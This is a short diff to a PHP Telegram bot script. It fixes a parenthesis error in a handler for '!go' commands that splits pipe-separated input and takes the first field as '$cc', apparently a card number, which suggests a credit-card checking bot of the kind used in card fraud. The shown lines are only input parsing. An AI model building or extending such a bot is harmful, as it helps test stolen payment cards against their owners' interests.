@@ -2037,7 +2037,7 @@ editMessage($chat_id, $response, $id_text);
 }
 
 
-elseif(strpos($message, "!go") === 0)||(strpos($message, "/go") === 0)||(strpos($message, ".go") === 0)){            
+elseif((strpos($message, "!go") === 0)||(strpos($message, "/go") === 0)||(strpos($message, ".go") === 0)){            
 $lista = substr($message, 4);
 $i = preg_split('/[|:| ]/', $lista);
 $cc    = trim($i[0]);
